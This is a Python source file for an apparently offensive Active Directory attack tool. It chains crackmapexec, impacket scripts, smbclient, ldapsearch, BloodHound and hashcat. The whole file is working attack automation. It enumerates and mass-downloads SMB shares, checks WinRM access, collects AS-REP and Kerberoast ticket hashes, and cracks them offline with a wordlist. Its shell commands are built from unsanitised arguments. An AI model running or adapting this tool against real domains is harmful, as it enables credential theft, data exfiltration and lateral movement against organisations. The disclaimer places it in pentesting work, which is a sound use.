import argparse
import os
import shutil
import sys
import subprocess
import socket
import re


# application class 

class AppArg:
    def __init__(self, username=None, domain=None, password=None, ntlm_hash=None,usersfile=None,
                 target=None, wordlist='rockyou.txt', kerberos=False, ldap=False,
                 smb=False, full=False, winrm=False, bloodhound=False, crack=False,lookupsid=False,userspn=False,npusers=False):
        self._username = username
        self._domain = domain
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target = target
        self._wordlist = wordlist
        self._usersfile = usersfile
        self._kerberos = kerberos
        self._lookupsid = lookupsid
        self._npusers = npusers
        self._userspn = userspn
        self._ldap = ldap
        self._smb = smb
        self._full = full
        self._winrm = winrm
        self._bloodhound = bloodhound
        self._crack = crack

    @property
    def username(self):
        return self._username

    @property
    def domain(self):
        return self._domain

    @property
    def password(self):
        return self._password

    @property
    def ntlm_hash(self):
        return self._ntlm_hash

    @property
    def target(self):
        return self._target

    @property
    def wordlist(self):
        return self._wordlist

    @property
    def usersfile(self):
        return self._usersfile
    
    @property
    def kerberos(self):
        return self._kerberos
    
    @property
    def lookupsid(self):
        return self._lookupsid
    
    @property
    def npusers(self):
        return self._npusers
    
    @property
    def userspn(self):
        return self._userspn

    @property
    def ldap(self):
        return self._ldap

    @property
    def smb(self):
        return self._smb

    @property
    def full(self):
        return self._full

    @property
    def winrm(self):
        return self._winrm

    @property
    def bloodhound(self):
        return self._bloodhound

    @property
    def crack(self):
        return self._crack



def create_directories_if_not_exist(*directories):
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)



def create_files_if_not_exist(*files):
    for file_path in files:
        if not os.path.exists(file_path):
            with open(file_path, "w") as file:
                file.write("")  # Write an empty string to the file






RED="\033[1;31m"
BLUE="\033[1;34m"
RESET="\033[0m"
GREEN="\033[1;32m"
PURPLE="\033[1;35m"
ORANGE="\033[1;33m"
PINK="\033[1;35m"


# script banner
def display_banner():
	print(f"""{GREEN}
	
	         ██████╗██╗ ██████╗ █████╗ ██████╗  █████╗                    
                ██╔════╝██║██╔════╝██╔══██╗██╔══██╗██╔══██╗                   
                ██║     ██║██║     ███████║██║  ██║███████║                   
                ██║     ██║██║     ██╔══██║██║  ██║██╔══██║                   
                ╚██████╗██║╚██████╗██║  ██║██████╔╝██║  ██║                   
                 ╚═════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   
                 {ORANGE}|_ author _ 
			    | _ theblxckcicada _|{GREEN}               
                                                                              
███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ████████╗██╗   ██╗██╗     
████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝██║   ██║██║     
██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝   ██║   ██║   ██║██║     
██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗   ██║   ██║   ██║██
██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║   ██║   ╚██████╔╝███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝
                                                                              
	{RESET}""")
 
def display_disclaimer():
     print(f"""
           | {ORANGE}Disclaimer |                                                                                       |
                        | Usage of this pentest tool implies understanding and acceptance of potential risks,   |
                        | and the user assumes full responsibility for their actions.                           |
           {RESET}""")
# argument management 
def get_parser():
    parser = argparse.ArgumentParser(description='Script description')
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-d', '--domain', help='Domain name of the target machine')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-H', '--ntlm-hash', help='NTLM Hash for authentication')
    parser.add_argument('-t', '--target', help='Target host or IP address')
    parser.add_argument('-w', '--wordlist', default='rockyou.txt', help='Password list (default: rockyou.txt)')
    parser.add_argument('-us', '--usersfile', help='List of domain users')
    parser.add_argument('--kerberos', action='store_true', help='Enable kerberoasting mode')
    parser.add_argument('--lookupsid', action='store_true', help='Enable lookupsid mode')
    parser.add_argument('--npusers', action='store_true', help='Enable GetNPUsers mode')
    parser.add_argument('--userspn', action='store_true', help='Enable GetUserSPNs mode')
    parser.add_argument('--ldap', action='store_true', help='Enable LDAP mode Enumeration')
    parser.add_argument('--smb', action='store_true', help='Enable SMB mode Enumeration')
    parser.add_argument('--full', action='store_true', help='Enable full mode Enumeration')
    parser.add_argument('--winrm', action='store_true', help='Enable winrm mode Enumeration')
    parser.add_argument('--bloodhound', action='store_true', help='Enable bloodhound mode Enumeration')
    parser.add_argument('--crack', action='store_true', help='Crack Found Hashes')
    return parser

def get_args(parser):
	    return parser.parse_args()

 
def args_to_app_args(args):
    return AppArg(**vars(args))

# get arguments
parser = get_parser()
arguments = get_args(parser)
app_args = args_to_app_args(arguments)

# Define directory paths
if app_args.target:  
    current_directory = os.getcwd()
    base_directory = os.path.join(current_directory, "mastertul")
    target_directory = os.path.join(base_directory, app_args.target)
    smb_directory = os.path.join(target_directory, "smb_results")
    lookupsid_directory = os.path.join(target_directory, "lookupsid_results")
    kerberos_directory = os.path.join(target_directory, "kerberos_results")
    ldap_directory = os.path.join(target_directory, "ldap_results")
    smb_shares_directory = os.path.join(smb_directory, "smb")
    bloodhound_directory = os.path.join(target_directory, "bloodhound_results")
        
    # Define file paths
    get_np_users_file = os.path.join(kerberos_directory, "GetNPUsers_results.txt")
    get_user_spn_file = os.path.join(kerberos_directory, "GetUserSPNs_results.txt")
    ldap_file = os.path.join(ldap_directory, "ldap_results.txt")
    npusers_cracked_file = os.path.join(kerberos_directory, "npusers_cracked_hashes.txt")
    userspn_cracked_file = os.path.join(kerberos_directory, "userspn_cracked_hashes.txt")
    lookupsid_file = os.path.join(lookupsid_directory, "lookupsid_file.txt")
    users_file = os.path.join(lookupsid_directory, "users.txt")
    smb_file = os.path.join(smb_directory, "share_drives.txt")
    smb_shares_file = os.path.join(smb_directory, "share_names.txt")
    host_file = "/etc/hosts"  # Assuming this is a system file, no creation needed


def cmd_ref():
    display_disclaimer()
    print('----------------------------------------------------')
    print(f'Target IP: {ORANGE}{app_args.target}{RESET}')
    if app_args.domain:
        print(f'Domain: {ORANGE}{app_args.domain}{RESET}')
    print(f'Username: {ORANGE}{app_args.username}{RESET}')
    if app_args.password:
        print(f'Password: {ORANGE}{app_args.password}{RESET}')
    if app_args.ntlm_hash:
        print(f'NTLM Hash: {ORANGE}{app_args.ntlm_hash}{RESET}')
        
    if not app_args.full:
        if app_args.kerberos:
            print(f'{BLUE}Kerberoasting Mode Enabled{RESET}')
        else:
            if app_args.lookupsid:
                print(f'{BLUE}Lookupsid Mode Enabled{RESET}')
            if app_args.npusers:
                print(f'{BLUE}GetNPUsers Mode Enabled{RESET}')
            if app_args.userspn:
                print(f'{BLUE}GetUserSPNs Mode Enabled{RESET}')
                
        if app_args.ldap:
            print(f'{BLUE}LDAP Mode Enabled{RESET}')
        if app_args.smb:
            print(f'{BLUE}SMB Mode Enabled{RESET}')
        if app_args.winrm:
            print(f'{BLUE}WinRM Mode Enabled{RESET}')
        if app_args.bloodhound:
            print(f'{BLUE}Bloodhound Mode Enabled{RESET}')
        if app_args.crack:
            print(f'{BLUE}Cracking Mode Enabled{RESET}')
    if app_args.full:
        print(f'{BLUE}Full Mode Enabled{RESET}')
    print('----------------------------------------------------')
    
def validate_arguments():
    if app_args.target is None or  app_args.username is None or app_args.password is None:
        parser.print_help()
        sys.exit(1)

def setup_app():
    
    # Display banner
    display_banner()
    
    # validate incoming arguments 
    validate_arguments()
    cmd_ref()
    
    # Create directories if they don't exist
    create_directories_if_not_exist(
        base_directory,
        target_directory,
        smb_directory,
        lookupsid_directory,
        kerberos_directory,
        ldap_directory,
        smb_shares_directory,
        bloodhound_directory
    )
    # Create files if they don't exist
    create_files_if_not_exist(
        get_np_users_file,
        get_user_spn_file,
        ldap_file,
        npusers_cracked_file,
        userspn_cracked_file,
        lookupsid_file,
        users_file,
        smb_file,
        smb_shares_file
    )

def generate_cme_cmd(username,password,hash,server,crack_type,cmd):
    if password is not None:
        message = f"sudo crackmapexec {crack_type} {server} -u '{username}' -p '{password}' {cmd}"
    if hash is not None:
        message = f"sudo crackmapexec {crack_type} {server} -u '{username}' -H '{hash}' {cmd}"
    return message

def run_command(message):
    try:
        command = subprocess.Popen(
                        message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = command.stdout.read() + command.stderr.read()
        return output.decode(encoding='cp1252')
    except Exception as error:
        return error
    
def list_smb_shares(username, password, hash, server):
    print(f'{PURPLE}{PURPLE}[!]  Enumerating SMB...{RESET}')
    command = generate_cme_cmd(username, password,hash, server, "smb", "--shares")
    results =  run_command(command)
    # Save to file 
    if 'Pwn3d' in results:
        pattern = r"\b\x1b\[\d+m(\w+)\s+READ\b"
        # Find all matches in the data
        matches = re.findall(pattern, results)
        # Remove escape sequences and extract share names from the matches
        share_names = [match for match in matches if match.upper() != "PERMISSIONS"]
        
        # save share names to file 
        result_string = '\n'.join(share_names)
        save_to_file(smb_shares_file,result_string)
        print(f'{GREEN}[+]  SMB share drive names saved to {smb_shares_file}{RESET}')
        
        # save crackmap results to file
        save_to_file(smb_file,results)
        print(f'{GREEN}[+]  SMB share drives list saved to {smb_file}{RESET}')
        
        # Download smb files 
        # download files 
        print(f'{ORANGE}[*]  Downloading SMB share files to {smb_shares_directory}{RESET}')
        for share_name in share_names:
            download_smb_files(username,password,hash,server,share_name)       
         
def save_to_file(destination,results):
    with open(destination,'w') as file:
            file.write(results)
            
def remove_empty_files(directory):
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath) and os.path.getsize(filepath) == 0:
            os.remove(filepath)
            
def download_smb_files(username,password,hash,server,share_name):
    if username is not None and hash is not None:
        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory};prompt OFF;recurse ON;mget *;exit;' -U '{username}' --pw-nt-hash '{hash}'"
    if username is not None and password is not None:
        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory};prompt OFF;recurse ON;mget *;exit;' -U '{username}%{password}'"
    else:
        smb_download = f"smbclient //{server}/{share_name} -c 'lcd {smb_shares_directory};prompt OFF;recurse ON;mget *;exit;' -N"
    
    run_command(smb_download)
    
    
def enum_smb(username,password,hash,server):
           list_smb_shares(username,password,hash,server)


def enum_winrm(username,password,hash,server):
    command = generate_cme_cmd(username,password,hash,server,'winrm','')
    results =  run_command(command)
    if 'Pwn3d' in results:
        print(f'{GREEN}[+]  WinRM access granted{RESET}')
    else:
        print(f'{RED}[-]  WinRM access denied{RESET}')

def gen_impacket_access(username,password,hash,server,domain):
    if domain:
        if username and password:
            message = f"'{domain}/{username}:{password}'@{server} "
        
        if username and hash:
            message = f"'{domain}/{username}'@{server} -hashes :{hash} "
        
        if not username or not password:
            message = f"'{domain}/{username}'@{server} -no-pass "
    else:
        if username and password:
            message = f"'{username}:{password}'@{server} "
        
        if username and hash:
            message = f"'{username}'@{server} -hashes :{hash} "
        
        if not username or not password:
            message = f"'{username}'@{server} -no-pass "
    return message 

def enum_lookupsid(username,password,hash,server,domain):
    print(f'{PURPLE}[!]  Enumerating Lookupsids using impacket...{RESET}')
    # Get Lookupsids
    command = f"lookupsid.py {gen_impacket_access(username,password,hash,server,domain)}"
    results = run_command(command)
    if results:
        save_to_file(lookupsid_file,results)
        print(f'{GREEN}[+]  Lookupsids saved to {lookupsid_file}{RESET}')
    
    # Get users
    command = f"lookupsid.py {gen_impacket_access(username,password,hash,server,domain)} |  awk -F '[:\\\\\\\\(\\\\)]' '/SidTypeUser/ {{print $3}}'"
    results = run_command(command)
    if results:
        save_to_file(users_file,results)
        print(f'{GREEN}[+]  Users saved to {users_file}{RESET}')


def get_NPUsers(username,password,hash,server,domain):
    print(f"{PURPLE}[!]  Enumerating NPUsers using impacket...{RESET}")
    command = f"GetNPUsers.py {gen_impacket_access(username,password,hash,server,domain)} -usersfile {app_args.usersfile or users_file} | grep '^$krb5asrep' "
    results = run_command(command)
    if results:
        save_to_file(get_np_users_file,results)
        print(f'{GREEN}[+]  Saved NPUsers hashes to {get_np_users_file}{RESET}')
    else:
        print(f'{RED}[-]  No NPUsers found{RESET}')

def get_UserSPNs(username,password,hash,server,domain):
    print(f"{PURPLE}[!]  Enumerating UserSPNs using impacket...{RESET}")
    command = f"GetUserSPNs.py {gen_impacket_access(username,password,hash,server,domain)}  -request | grep '^$krb5tgs' "
    results = run_command(command)
    if results:
        save_to_file(get_user_spn_file,results)
        print(f'{GREEN}[+]  Saved UserSPNs hashes to {get_user_spn_file}{RESET}')
    else:
        print(f'{RED}[-]  No UserSPNs found')

def crack_hashes():
    print(f"{PURPLE}[!]  Cracking hashes using hashcat...{RESET}")
    if get_np_users_file:
        command = f"hashcat {get_np_users_file} {app_args.wordlist} -m 18200 | grep '^$krb5asrep'| uniq "
        results = run_command(command)
        if results:
            save_to_file(npusers_cracked_file,results)
            print(f'{GREEN}[+]  Cracked Kerberos NPUsers hashes saved to {npusers_cracked_file}')
        else:
            print(f'{RED}[-]  No Kerberos NPUsers hashes found')
            
    if get_user_spn_file:
        command = f"hashcat {get_user_spn_file} {app_args.wordlist}  -m 13100  | grep '^$krb5tgs' | uniq "
        results = run_command(command)
        if results:
            save_to_file(userspn_cracked_file,results)
            print(f'{GREEN}[+]  Cracked Kerberos UserSPNs hashes saved to {userspn_cracked_file}{RESET}')
        else:
            print(f'{RED}[-]  No Kerberos UserSPNs hashes found{RESET}')

def domain_to_dc(domain):
    components = domain.split('.')
    dc_components = ['DC=' + comp for comp in components]
    return ','.join(dc_components)

def enum_ldap(username,password,hash,server,domain):
    print(f"{PURPLE}[!]  Enumerating LDAP...{RESET}")
    if domain:
        command = f"ldapsearch -x -H ldap://{server} -b '{domain_to_dc(domain)}' -D '{username}' -w '{password}' "
        results = run_command(command)
        if results:
            save_to_file(ldap_file,results)
            print(f'{GREEN}[+]  LDAP saved to {ldap_file}{RESET}')

def move_bloddhound_files():
    files = os.listdir(current_directory)

    # Filter the list to only include files ending with '.json'
    json_files = [f for f in files if f.endswith('.json')]
    # Move each JSON file to the destination directory
    for file in json_files:
        src_path = os.path.join(current_directory, file)
        dest_path = os.path.join(bloodhound_directory, file)
        shutil.move(src_path, dest_path)
        
        
def enum_bloodhound(username,password,hash,server,domain):
    print(f"{PURPLE}[!] Collecting Bloodhound Files...{RESET}")
    if username and password:
        command = f"bloodhound-python -d {domain} -u '{username}' -p '{password}' -ns {server} -c all"  
    if username and hash :
        command = f"bloodhound-python -d {domain} -u '{username}' --hashes '{hash}' -ns {server} -c all"    
    results = run_command(command)
    if results:
        print(f'{GREEN}[+]  Bloodhound saved to {bloodhound_directory}')
    move_bloddhound_files()

def handle_request(username,password,hash,server,domain):
    if app_args.full:
        enum_smb(username,password,hash,server)
        enum_winrm(username,password,hash,server)
        enum_lookupsid(username,password,hash,server,domain)
        get_NPUsers(username,password,hash,server,domain)
        get_UserSPNs(username,password,hash,server,domain)
        enum_bloodhound(username,password,hash,server,domain)
        enum_ldap(username,password,hash,server,domain)
    else:
        if app_args.kerberos:
            enum_lookupsid(username,password,hash,server,domain)
            get_NPUsers(username,password,hash,server,domain)
            get_UserSPNs(username,password,hash,server,domain)
        if app_args.smb:
            enum_smb(username,password,hash,server)
        
        if app_args.winrm:
            enum_winrm(username,password,hash,server)
        
        if app_args.lookupsid and not app_args.kerberos:
            enum_lookupsid(username,password,hash,server,domain)
        
        if app_args.ldap:
            enum_ldap(username,password,hash,server,domain)
        
        if app_args.bloodhound:
            enum_bloodhound(username,password,hash,server,domain)
        
        if app_args.npusers and not app_args.kerberos:
            get_NPUsers(username,password,hash,server,domain)
        
        if app_args.userspn and not app_args.kerberos:
            get_UserSPNs(username,password,hash,server,domain)
    
    if app_args.crack:
        if app_args.wordlist:
            crack_hashes()
        else:
            print(f'{RED}[-]  No wordlist provided{RESET}')
        

if __name__ == "__main__":   
    setup_app()
    handle_request(app_args.username,app_args.password,app_args.ntlm_hash,app_args.target,app_args.domain)
    remove_empty_files(current_directory)
